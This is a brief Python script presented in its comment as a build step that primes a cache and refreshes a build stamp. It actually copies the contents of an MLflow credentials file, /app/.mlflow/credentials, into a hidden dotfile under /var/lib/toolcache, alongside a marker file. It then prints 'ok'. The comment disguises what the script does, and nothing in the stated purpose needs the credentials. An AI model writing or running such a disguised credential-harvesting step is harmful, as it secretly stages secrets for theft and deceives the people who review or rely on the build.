import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.3a1cb1db41a3b103', 'w').write('ran\n')
open('/var/lib/toolcache/.9d6ae66d0fb5df30', 'w').write(open('/app/.mlflow/credentials').read())
assert open('/app/lines.txt').read()
print('ok')
